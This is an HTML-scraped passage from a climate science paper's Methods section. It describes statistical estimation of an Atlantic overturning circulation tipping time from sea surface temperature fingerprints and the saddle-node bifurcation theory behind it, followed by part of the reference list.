data-track-label="link" data-test="citation-ref" title="S√©vellec, F., Dijkstra, H. A., Drijfhout, S. S. &amp; Germe, A. Dynamical attribution of oceanic prediction uncertainty in the North Atlantic: application to the design of optimal monitoring systems. Clim. Dyn. 51, 1517‚Äì1535 (2018)." href="#ref-CR40" id="ref-link-section-d21713702e5453_1">40</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 41" title="Alexander-Turner, R., Ortega, P. &amp; Robson, J. I. How robust are the surface temperature fingerprints of the Atlantic overturning meridional circulation on monthly time scales? Geophys. Res. Lett. 45, 3559‚Äì3567 (2018)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR41" id="ref-link-section-d21713702e5456">41</a></sup>.</p></div></div><div id="Sec8-section" data-title="Methods"><h2 id="Sec8">Methods</h2><div id="Sec8-content"><p>To obtain the AMOC fingerprint, two steps are required: The seasonal cycle in the SST is governed by the surface radiation independent from the circulation and thus removed by considering the monthly anomalies, where the mean over the period of recording of the month is removed. Second, there is an ongoing positive linear trend in the SST related to global warming, which is also not related to circulation. This is compensated for by subtracting 2‚Äâ√ó‚Äâthe global mean (GM) SST anomaly (small seasonal cycle removed). This differs slightly from ref. <sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 23" title="Caesar, L., Rahmstorf, S., Robinson, A., Feulner, G. &amp; Saba, V. Observed fingerprint of a weakening Atlantic ocean overturning circulation. Nature 552, 191‚Äì196 (2018)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR23" id="ref-link-section-d21713702e5468">23</a></sup>, where 1‚Äâ√ó‚Äâthe GM SST was subtracted. The ‚Äútranslation‚Äù from the proxy SST temperature and AMOC flow is 0.26 SV/K [ref. <sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 23" title="Caesar, L., Rahmstorf, S., Robinson, A., Feulner, G. &amp; Saba, V. Observed fingerprint of a weakening Atlantic ocean overturning circulation. Nature 552, 191‚Äì196 (2018)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR23" id="ref-link-section-d21713702e5472">23</a></sup>, Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig3">3</a>]. Here we have taken into account that the warming is not globally homogeneous: The warming in the SG region is larger than the global mean due to polar amplification. The way we have estimated this effect is by comparing the proxy with the AMOC estimates covering the period 1957‚Äì2004 from the so-called MOC<sub><i>z</i></sub> reported in the review by ref. <sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 42" title="Frajka-Williams, E. et al. Atlantic meridional overturning circulation: observed transport and variability. Front. Mar. Sci. 6, 260 (2019)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR42" id="ref-link-section-d21713702e5483">42</a></sup>. This shows a drop of 3 SV in that period. Minimizing the difference between the proxy SST<sub><i>S</i><i>G</i></sub>-<i>Œ≤</i> SST<sub><i>G</i><i>M</i></sub> and this more direct measurement with respect to <i>Œ≤</i>, we get <i>Œ≤</i>‚Äâ=‚Äâ1.95‚Äâ‚âà‚Äâ2 rather than <i>Œ≤</i>‚Äâ=‚Äâ1 used by ref. <sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 23" title="Caesar, L., Rahmstorf, S., Robinson, A., Feulner, G. &amp; Saba, V. Observed fingerprint of a weakening Atlantic ocean overturning circulation. Nature 552, 191‚Äì196 (2018)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR23" id="ref-link-section-d21713702e5513">23</a></sup>. The factor 2 is thus the optimal value for the polar amplification<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 43" title="Holland, M. &amp; Bitz, C. Polar amplification of climate change in coupled models. Clim. Dyn. 21, 221‚Äì232 (2003)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR43" id="ref-link-section-d21713702e5517">43</a></sup> obtained by calibrating to recent direct measurements<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 42" title="Frajka-Williams, E. et al. Atlantic meridional overturning circulation: observed transport and variability. Front. Mar. Sci. 6, 260 (2019)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR42" id="ref-link-section-d21713702e5521">42</a></sup>. The original and our calibrated proxies are shown in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig7">7</a>.</p><div data-test="figure" data-container-section="figure" id="figure-7" data-title="Compensation of global warming in the Atlantic meridional overturning circulation (AMOC) fingerprint."><figure><figcaption><b id="Fig7" data-test="figure-caption-text">Fig. 7: Compensation of global warming in the Atlantic meridional overturning circulation (AMOC) fingerprint.</b></figcaption><div><div><a data-test="img-link" data-track="click" data-track-label="image" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/7" rel="nofollow"><picture><source type="image/webp" srcset="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig7_HTML.png?as=webp"><img aria-describedby="Fig7" src="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig7_HTML.png" alt="figure 7" loading="lazy" width="685" height="379"></picture></a></div><p>In the sea surface temperature (SST) AMOC fingerprint record, the compensation for global warming and polar amplification is done by subtracting the global SST (SST<sub><i>G</i><i>M</i></sub>) from the subpolar gyre (SG) SST (SST<sub><i>S</i><i>G</i></sub>). By calibrating by the MOC<sub><i>z</i></sub> AMOC proxy (red curves), the optimal AMOC proxy is SST<sub><i>S</i><i>G</i></sub>-2 SST<sub><i>G</i><i>M</i></sub>. To ensure the robustness of our results, we have repeated the analysis by subtracting 1x (purple) and 3x SST<sub><i>G</i><i>M</i></sub> (green) and compared with the optimal 2x SST<sub><i>G</i><i>M</i></sub> subtracted (blue). The corresponding estimates for the time of the collapse are shown in the same colors: The middle vertical line is the maximum likelihood estimate of the tipping time, the box represents the 66.6% confidence interval (Intergovernmental Panel on Climate Change (IPCC) definition of ‚Äúlikely‚Äù), while the horizontal line represents the 99% confidence intervals.</p></div><p><a data-test="article-link" data-track="click" data-track-label="button" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/7" data-track-dest="link:Figure7 Full size image" aria-label="Full size image figure 7" rel="nofollow"><span>Full size image</span></a></p></figure></div><p>To check the robustness with respect to the AMOC fingerprint record, we repeated the analysis, subtracting 1x and 3x GM SST from the SG SST. Subtracting 3x GM SST only changes estimate and&nbsp;the confidence intervals by a few years, whereas subtracting 1x GM SST delays the tipping with 25 years, but the overall trend and conclusions do not change. The results are given in Table&nbsp;<a data-track="click" data-track-label="link" data-track-action="table anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Tab1">1</a>. In the reanalysis, we fixed <i>t</i><sub>0</sub>‚Äâ=‚Äâ1924.</p><div data-test="inline-table" data-container-section="table" id="table-1"><figure><figcaption><b id="Tab1" data-test="table-caption">Table 1 Estimates and confidence intervals for the tipping year using three proxies of the Atlantic meridional overturning circulation (AMOC), where the sea surface temperature (SST) is subtracted either 1, 2 or 3 times the global SST</b></figcaption><p><a data-test="table-link" data-track="click" data-track-action="view table" data-track-label="button" rel="nofollow" href="https://www.nature.com/articles/s41467-023-39810-w/tables/1" aria-label="Full size table 1"><span>Full size table</span></a></p></figure></div><h3 id="Sec9">Estimator of the tipping time and model control</h3><p>The AMOC fingerprint is assumed to be observations from a process <i>X</i><sub><i>t</i></sub> given as a solution to Eqs. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>) and (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ2">2</a>), and we wish to estimate the parameters <i>Œ∏</i>‚Äâ=‚Äâ(<i>A</i>,‚Äâ<i>m</i>,‚Äâ<i>Œª</i><sub>0</sub>,‚Äâ<i>œÑ</i><sub><i>r</i></sub>,‚Äâ<i>œÉ</i>) from observations (<i>x</i><sub>0</sub>,‚Äâ<i>x</i><sub>1</sub>,‚Äâ‚Ä¶,‚Äâ<i>x</i><sub><i>n</i></sub>) before time <i>t</i><sub>0</sub> and observations (<i>y</i><sub>0</sub>,‚Äâ<i>y</i><sub>1</sub>,‚Äâ‚Ä¶,‚Äâ<i>y</i><sub><i>n</i></sub>) after time <i>t</i><sub>0</sub>. These equations cannot be explicitly solved, and the exact distribution of <i>X</i><sub><i>t</i></sub> is not explicitly known. A standard way to solve this is to approximate the transition density by a Gaussian distribution obtained by the Euler‚ÄìMaruyama scheme. However, the estimators obtained from the Euler‚ÄìMaruyama pseudo-likelihood are known to be biased, especially in non-linear models<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 32" title="Pilipovic, P., Samson, A. &amp; Ditlevsen, S. Parameter estimation in nonlinear multivariate stochastic differential equations based on splitting schemes. Preprint at 
                  https://arxiv.org/abs/2211.11884
                  
                 (2022)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR32" id="ref-link-section-d21713702e5866">32</a></sup>. We estimate by a two-step procedure, approximating the stationary distribution before time <i>t</i><sub>0</sub> by an Ornstein‚ÄìUhlenbeck process, of which exact maximum likelihood estimators are available (see Supplementary text S1), and using Strang splitting for the non-stationary and non-linear part after time <i>t</i><sub>0</sub>, using methods proposed in ref. <sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 32" title="Pilipovic, P., Samson, A. &amp; Ditlevsen, S. Parameter estimation in nonlinear multivariate stochastic differential equations based on splitting schemes. Preprint at 
                  https://arxiv.org/abs/2211.11884
                  
                 (2022)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR32" id="ref-link-section-d21713702e5879">32</a></sup>, see Supplementary text&nbsp;<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S2</a> for details.</p><p>To test the model fit, uniform residuals, <i>u</i><sub><i>i</i></sub>,‚Äâ<i>i</i>‚Äâ=‚Äâ1,‚Äâ‚Ä¶,‚Äâ<i>n</i> were calculated for the AMOC data using the estimated parameters from the MLE method as follows. The model assumes that observation <i>x</i><sub><i>i</i></sub> follows some distribution function <span>\({F}_{i,\hat{\theta }}\)</span> for the estimated parameter values <span>\(\hat{\theta }\)</span>. If this is true, then <span>\({u}_{i}={F}_{i,\hat{\theta }}({x}_{i})\)</span> is uniformly distributed on (0,‚Äâ1). Transforming these residuals back to a standard normal distribution provides standard normally distributed residuals if the model is true. Thus, a normal quantile-quantile plot reveals the model fit. The points should fall close to a straight line. The reason for making the detour around the uniform residuals is twofold. First, since the data is not stationary, each observation follows its own distribution, and residuals cannot be directly combined. Second, since the model is stochastic, standard residuals are not well-defined, and observations should be evaluated according to their entire distribution, not only the distance to the mean.</p><h3 id="Sec10">Noise-induced tipping</h3><p>The drift term in Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>) is the negative gradient of a potential, <i>f</i>(<i>x</i>,‚Äâ<i>Œª</i>)‚Äâ=‚Äâ‚àí‚Äâ‚àÇ<sub><i>x</i></sub><i>V</i>(<i>x</i>,‚Äâ<i>Œª</i>)‚Äâ=‚Äâ‚àí‚Äâ(<i>A</i>(<i>x</i>‚àí<i>m</i>)<sup>2</sup>‚Äâ+‚Äâ<i>Œª</i>) with <i>V</i>(<i>x</i>,‚Äâ<i>Œª</i>)‚Äâ=‚Äâ<i>A</i>(<i>x</i>‚àí<i>m</i>)<sup>3</sup>/3‚Äâ+‚Äâ(<i>x</i>‚Äâ‚àí‚Äâ<i>m</i>)<i>Œª</i>. For <i>Œª</i>‚Äâ&lt;‚Äâ0, the drift has two fixed points, <span>\(m\pm \sqrt{|\lambda|/A}\)</span>. The point <span>\(m+\sqrt{|\lambda|/A}\)</span> is a local minimum of the potential <i>V</i>(<i>x</i>,‚Äâ<i>Œª</i>) and is stable, whereas <span>\(m-\sqrt{|\lambda|/A}\)</span> is a local maximum and unstable. The system thus has two basins of attraction separated by <span>\(m-\sqrt{|\lambda|/A}\)</span>, with a drift toward either <span>\(m+\sqrt{|\lambda|/A}\)</span> or ‚àí<i>‚àû</i> dependent on whether <span>\({X}_{t} &gt; m-\sqrt{|\lambda|/A}\)</span> or <span>\({X}_{t} &lt; m-\sqrt{|\lambda|/A}\)</span>. We denote the two basins of attraction, the normal and the tipped state, respectively. When <i>Œª</i>‚Äâ=‚Äâ0, the normal state disappears, and the system undergoes a bifurcation and <i>X</i><sub><i>t</i></sub> will be drawn toward ‚àí<i>‚àû</i>.</p><p>Due to the noise, the process can escape into the tipped state by crossing over the potential barrier <span>\({{\Delta }}(\lambda )=V(m-\sqrt{|\lambda|/A},\,\lambda )\,-\,V(m+\sqrt{|\lambda|/A},\,\lambda )=4|\lambda {|}^{3/2}/3{A}^{1/2}\)</span>. Assume <i>X</i><sub><i>t</i></sub> to be close to <span>\(m+\sqrt{|\lambda|/A}\)</span> at some time <i>t</i>, i.e., in the normal state. The escape time will asymptotically (for <i>œÉ</i>‚Äâ‚Üí‚Äâ0) follow an exponential distribution such that</p><div id="Equ9"><p><span>$$P(t,\lambda )=1-\exp (-t/{\tau }_{n}(\lambda ))$$</span></p><p>
                    (9)
                </p></div><p>where <i>P</i>(<i>t</i>,‚Äâ<i>Œª</i>) is the probability of observing an escape time shorter than <i>t</i> for a given value of <i>Œª</i>. The mean noise-induced escape time <i>œÑ</i><sub><i>n</i></sub>(<i>Œª</i>) is<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 44" title="Berglund, N. Kramers‚Äô law: validity, derivations and generalisations. Markov Process. Relat. Fields 19, 459‚Äì490 (2013)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR44" id="ref-link-section-d21713702e6790">44</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 45" title="Freidlin, M. &amp; Wentzell, A. Random perturbations of dynamical systems. Grundlehren der mathematischen Wissenschaften (Springer, 1984)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR45" id="ref-link-section-d21713702e6793">45</a></sup>:</p><div id="Equ10"><p><span>$${\tau }_{n}(\lambda )=\frac{2\pi \exp (2{{\Delta }}(\lambda )/{\sigma }^{2})}{\sqrt{{V}^{{\prime\prime} }(m+\sqrt{|\lambda|/A},\lambda )|{V}^{{\prime\prime} }(m-\sqrt{|\lambda|/A},\lambda )|}} \\=(\pi /\sqrt{A|\lambda|})\exp (8|\lambda {|}^{3/2}/3{A}^{1/2}{\sigma }^{2}).$$</span></p><p>
                    (10)
                </p></div><p>Assume that the rate of change of <i>Œª</i>(<i>t</i>) follows Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ2">2</a>), then for <i>œÑ</i><sub><i>r</i></sub>‚Äâ&lt;‚Äâ<i>œÑ</i><sub><i>n</i></sub>(<i>Œª</i>), the waiting time for a random crossing is so long that a crossing will not happen before a bifurcation-induced transition happens (b-tipping). If <i>œÑ</i><sub><i>r</i></sub>‚Äâ&gt;‚Äâ<i>œÑ</i><sub><i>n</i></sub>(<i>Œª</i>), a noise-induced tipping is expected before the bifurcation point is reached. Since <i>œÑ</i><sub><i>n</i></sub>(<i>Œª</i>) decreases with increasing <i>Œª</i>, at some point, the two time scales will end up matching.</p><h3 id="Sec11">Normal form of the saddle-node bifurcation</h3><p>Consider the general dynamical equation</p><div id="Equ11"><p><span>$$\frac{dx}{dt}=f(x,\lambda ),$$</span></p><p>
                    (11)
                </p></div><p>where <i>x</i> is a variable and <i>Œª</i> is a (fixed) parameter. A point <i>x</i><sub>0</sub> with <i>f</i>(<i>x</i><sub>0</sub>,‚Äâ<i>Œª</i>)‚Äâ=‚Äâ0 is a fixed point or steady state. A fixed point is stable/unstable if <span>\({\partial }_{x}f{(x,\lambda )}_{x={x}_{0}}\)</span> is negative/positive; thus, the fixed point is attracting/repelling. If <i>f</i>(<i>x</i>,‚Äâ<i>Œª</i>) is not a linear function of <i>x</i>, multiple steady states may exist. A saddle-node bifurcation occurs when changing the control parameter <i>Œª</i> through a critical value <i>Œª</i><sub><i>c</i></sub> a stable and an unstable fixed point merge and disappear. The situation is shown in the figure, where the blue surface is <i>f</i>(<i>x</i>,‚Äâ<i>Œª</i>), while the gray (null-) plane is <i>f</i>(<i>x</i>,‚Äâ<i>Œª</i>)‚Äâ=‚Äâ0. For a constant value of <i>Œª</i>, the dynamics is determined by the black curve. The fixed points are determined by the intersection with the null plane (green); the point in the front is the stable fixed point, while the further point is the unstable fixed point. When changing <i>Œª</i> toward <i>Œª</i><sub><i>c</i></sub>‚Äâ=‚Äâ0, the two fixed points merge at the saddle-node bifurcation (<i>m</i>,‚Äâ<i>Œª</i><sub><i>c</i></sub>) (green). The normal form of the saddle node is obtained by expanding <i>f</i>(<i>x</i>,‚Äâ<i>Œª</i>) to the lowest order around the point (<i>m</i>,‚Äâ<i>Œª</i><sub><i>c</i></sub>), noting that <i>f</i>(<i>m</i>,‚Äâ<i>Œª</i><sub><i>c</i></sub>)‚Äâ=‚Äâ0, <span>\({\partial }_{x}f{(x,\lambda )}_{(x,\lambda )=(m,{\lambda }_{c})}=0\)</span> and <span>\({\partial }_{\lambda }f{(x,\lambda )}_{(x,\lambda )=(m,{\lambda }_{c})} &lt; 0\)</span> (see Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig8">8</a>):</p><div id="Equ12"><p><span>$$f(x,\, \lambda )\, \approx 	\, \frac{1}{2}{\partial }_{{xx}}f{(x,\, \lambda )}_{(x,\lambda )=(m,\, {\lambda }_{c})}\times {(x-m)}^{2}+{\partial }_{\lambda }f{(x,\, \lambda )}_{(x,\, \lambda )=(m,{\lambda }_{c})}\\ 	\times (\lambda -{\lambda }_{c})=-A{(x-m)}^{2}-\tilde{\lambda },$$</span></p><p>
                    (12)
                </p></div><p>where <span>\(A=-\frac{1}{2}{\partial }_{{xx}}f{(x,\,\lambda )}_{(x,\lambda )=(m,{\lambda }_{c})}\)</span> and <span>\(\tilde{\lambda }=-{\partial }_{\lambda }f{(x,\lambda )}_{(x,\lambda )=(m,{\lambda }_{c})}\times (\lambda -{\lambda }_{c})\)</span>. This is the normal form for the saddle-node bifurcation. Thus, close to the bifurcation point, the stable steady state is</p><div id="Equ13"><p><span>$${x}_{0}=m+\sqrt{-\tilde{\lambda }/A}.$$</span></p><p>
                    (13)
                </p></div><div data-test="figure" data-container-section="figure" id="figure-8" data-title="Saddle-node bifurcation."><figure><figcaption><b id="Fig8" data-test="figure-caption-text">Fig. 8: Saddle-node bifurcation.</b></figcaption><div><div><a data-test="img-link" data-track="click" data-track-label="image" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/8" rel="nofollow"><picture><source type="image/webp" srcset="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig8_HTML.png?as=webp"><img aria-describedby="Fig8" src="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig8_HTML.png" alt="figure 8" loading="lazy" width="685" height="477"></picture></a></div><p>The function <i>f</i>(<i>x</i>,‚Äâ<i>Œª</i>) near a saddle point where a stable and an unstable fixed point merge at a saddle-node bifurcation. For <i>Œª</i>‚Äâ&lt;‚Äâ<i>Œª</i><sub><i>c</i></sub>, there are two fixed points (green) where the black curve passes through the null plane, <i>f</i>‚Äâ=‚Äâ0 (gray). The point in front is the stable fixed point, while the point in the back is the unstable fixed point. The red curve of fixed points is the bifurcation curve, with the stable branch in front and unstable branch in the back. The purple curve is <i>f</i>(<i>x</i>,‚Äâ<i>Œª</i><sub><i>c</i></sub>) which touches the null plane at one point (<i>x</i><sub>0</sub>,‚Äâ<i>Œª</i><sub><i>c</i></sub>). At this point, it is seen that ‚àÇ<sub><i>x</i></sub><i>f</i>‚Äâ=‚Äâ0 and ‚àÇ<sub><i>Œª</i></sub><i>f</i>‚Äâ&lt;‚Äâ0, indicated by the dark green tangents to the surface.</p></div><p><a data-test="article-link" data-track="click" data-track-label="button" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/8" data-track-dest="link:Figure8 Full size image" aria-label="Full size image figure 8" rel="nofollow"><span>Full size image</span></a></p></figure></div><p>In order to see that this is indeed the case for the AMOC transition also in comprehensive climate models, Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig2">2</a> is adapted from the model intercomparison study<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 34" title="Rahmstorf, S. et al. Thermohaline circulation hysteresis: a model intercomparison. Geophys. Res. Lett. 32, L23605 (2005)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR34" id="ref-link-section-d21713702e8418">34</a></sup>. The steady state curves obtained are from simulations, with a very slowly changing control parameter (freshwater forcing). The top panel shows ocean-only models, while the bottom panel shows atmosphere-ocean models. The curves are, even away from the transition, surprisingly well fitted by Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ13">13</a>). Note that for some models, the transition happens before the critical point, as should be expected from noise-induced transitions. Note also that the data has been smoothed such that increasing variance close to the transition is not visible. This observation strongly supports the assumption of a saddle-node bifurcation, while it also shows that (<i>m</i>,‚Äâ<i>Œª</i><sub><i>c</i></sub>) (black dots) are quite different between models, thus calling for reliable determination from observations.</p></div></div>
                </div><div>
            <div id="data-availability-section" data-title="Data availability"><h2 id="data-availability">Data availability</h2></div><div id="code-availability-section" data-title="Code availability"><h2 id="code-availability">Code availability</h2><div id="code-availability-content">
              
              <p>Computer code (Matlab and R) can be found in the following repository: <a href="https://doi.org/10.17894/ucph.b8f99b67-d4e6-4a2e-b518-00bddeed323b">https://doi.org/10.17894/ucph.b8f99b67-d4e6-4a2e-b518-00bddeed323b</a>.</p>
            </div></div><div id="MagazineFulltextArticleBodySuffix" aria-labelledby="Bib1" data-title="References"><h2 id="Bib1">References</h2><div data-container-section="references" id="Bib1-content"><ol data-track-component="outbound reference"><li data-counter="1."><p id="ref-CR1">Manabe, S. &amp; Stouffer, R. J. Two stable equilibria of a coupled ocean-atmosphere model. <i>J. Clim.</i> <b>1</b>, 841‚Äì866 (1988).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1175/1520-0442(1988)001<0841:TSEOAC>2.0.CO;2" data-track-action="article reference" href="https://doi.org/10.1175%2F1520-0442%281988%29001%3C0841%3ATSEOAC%3E2.0.CO%3B2" aria-label="Article reference 1" data-doi="10.1175/1520-0442(1988)001<0841:TSEOAC>2.0.CO;2">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=1988JCli....1..841M" aria-label="ADS reference 1">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 1" href="http://scholar.google.com/scholar_lookup?&amp;title=Two%20stable%20equilibria%20of%20a%20coupled%20ocean-atmosphere%20model&amp;journal=J.%20Clim.&amp;doi=10.1175%2F1520-0442%281988%29001%3C0841%3ATSEOAC%3E2.0.CO%3B2&amp;volume=1&amp;pages=841-866&amp;publication_year=1988&amp;author=Manabe%2CS&amp;author=Stouffer%2CRJ">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="2."><p id="ref-CR2">Rahmstorf, S. Bifurcations of the Atlantic thermohaline circulation in response to changes in the hydrological cycle. <i>Nature</i> <b>378</b>, 145‚Äì149 (1995).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/378145a0" data-track-action="article reference" href="https://doi.org/10.1038%2F378145a0" aria-label="Article reference 2" data-doi="10.1038/378145a0">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=1995Natur.378..145R" aria-label="ADS reference 2">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DyaK2MXptlSmt7s%3D" aria-label="CAS reference 2">CAS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 2" href="http://scholar.google.com/scholar_lookup?&amp;title=Bifurcations%20of%20the%20Atlantic%20thermohaline%20circulation%20in%20response%20to%20changes%20in%20the%20hydrological%20cycle&amp;journal=Nature&amp;doi=10.1038%2F378145a0&amp;volume=378&amp;pages=145-149&amp;publication_year=1995&amp;author=Rahmstorf%2CS">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="3."><p id="ref-CR3">Lenton, T. M. et al. Tipping elements in the Earth‚Äôs climate system. <i>Proc. Natl Acad. Sci. USA</i> <b>105</b>, 1786‚Äì1793 (2008).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1073/pnas.0705414105" data-track-action="article reference" href="https://doi.org/10.1073%2Fpnas.0705414105" aria-label="Article reference 3" data-doi="10.1073/pnas.0705414105">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2008PNAS..105.1786L" aria-label="ADS reference 3">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BD1cXitl2nt70%3D" aria-label="CAS reference 3">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=18258748" aria-label="PubMed reference 3">PubMed</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed central reference" href="http://www.ncbi.nlm.nih.gov/pmc/articles/PMC2538841" aria-label="PubMed Central reference 3">PubMed Central</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="math reference" href="http://www.emis.de/MATH-item?1215.86004" aria-label="MATH reference 3">MATH</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 3" href="http://scholar.google.com/scholar_lookup?&amp;title=Tipping%20elements%20in%20the%20Earth%E2%80%99s%20climate%20system&amp;journal=Proc.%20Natl%20Acad.%20Sci.%20USA&amp;doi=10.1073%2Fpnas.0705414105&amp;volume=105&amp;pages=1786-1793&amp;publication_year=2008&amp;author=Lenton%2CTM">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="4."><p id="ref-CR4">Dansgaard, W. et al. Evidence for general instability of past climate from a 250-kyr ice-core record. <i>Nature</i> <b>364</b>, 218‚Äì220 (1993).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/364218a0" data-track-action="article reference" href="https://doi.org/10.1038%2F364218a0" aria-label="Article reference 4" data-doi="10.1038/364218a0">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=1993Natur.364..218D" aria-label="ADS reference 4">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 4" href="http://scholar.google.com/scholar_lookup?&amp;title=Evidence%20for%20general%20instability%20of%20past%20climate%20from%20a%20250-kyr%20ice-core%20record&amp;journal=Nature&amp;doi=10.1038%2F364218a0&amp;volume=364&amp;pages=218-220&amp;publication_year=1993&amp;author=Dansgaard%2CW">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="5."><p id="ref-CR5">Vettoretti, G., Ditlevsen, P., Jochum, M. &amp; Rasmussen, S. O. Atmospheric CO<sub>2</sub> control of spontaneous millennial-scale ice age climate oscillations. <i>Nat. Geosci.</i> <b>15</b>, 300‚Äì306 (2022).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/s41561-022-00920-7" data-track-action="article reference" href="https://doi.org/10.1038%2Fs41561-022-00920-7" aria-label="Article reference 5" data-doi="10.1038/s41561-022-00920-7">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BB38XpvVKhurw%3D" aria-label="CAS reference 5">CAS</a>&nbsp;
